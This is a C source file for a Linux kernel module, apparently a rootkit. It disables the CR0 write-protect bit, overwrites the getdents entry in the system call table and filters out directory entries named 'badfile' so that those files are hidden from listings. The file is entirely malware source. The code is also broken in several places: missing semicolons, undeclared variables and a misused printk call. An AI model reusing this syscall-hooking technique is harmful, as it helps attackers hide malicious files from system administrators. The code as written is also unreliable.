#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <asm/cacheflush.h> 
#include <linux/slab.h>
#include <linux/sched.h>

#define BAD_FILE_NAME ("badfile")

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noam");
MODULE_DESCRIPTION("Basic Kernel Module");


struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[];
};

/*
Turns off the 16 bit in the cr0 register (i.e. WP bit)
*/
static void turn_off_write_protection(void)
{
    unsigned long cr0_register = read_cr0();
    clear_bit(16, &cr0_register);
    write_cr0(cr0_register);
}

/*
Turns on the 16 bit in the cr0 register (i.e. WP bit)
*/
static void turn_on_write_protection(void)
{
    unsigned long cr0_register = read_cr0();
    set_bit(16, &cr0_register);
    write_cr0(cr0_register);

}

unsigned long ** p_sys_call_table;
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dir_pointer, unsigned int count);

/*
The fake get_dents syscall which we will use instead of the original one so we could hide specific files.
*/
asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent *dir_pointer, unsigned int count)
{
    long index = 0;
    struct linux_dirent * current_entry = dir_pointer;
    long returned_bytes = original_getdents(fd, dir_pointer, count);
    if (returned_bytes <= 0)
    {
        printk(KERN_INFO, "dir is empty?");
        return returned_bytes
    }

    while (index < returned_bytes)
    {
        printk(KERN_INFO, "got one: %s", current_entry->d_name);
        if (0 == strncmp(current_entry->d_name, BAD_FILE_NAME, strlen(BAD_FILE_NAME)))
        {
            return_bytes -= current_entry->d_reclen;
            memmove(current_entry, (char *)current_entry + current_entry->d_reclen, returned_bytes - index);
        }
        else
        {
            previous_entry = current_entry
            index += current_entry->d_reclen;
        }
        current_entry = (struct linux_dirent *)((char *)dir_pointer + index);
    }
    return returned_bytes;
}

static int __init hook_init(void)
{
    p_sys_call_table = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    original_getdents = (asmlinkage long (*)(unsigned int, struct linux_dirent *, unsigned int))p_sys_call_table[__NR_getdents];
    turn_off_write_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long *)fake_getdents;
    turn_on_write_protection();
    return 0;
}

static void __exit hook_exit(void)
{
    turn_off_write_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
    turn_on_write_protection();
    printk(KERN_INFO "Goodbye, world!\n");
}

module_init(hook_init);
module_exit(hook_exit);
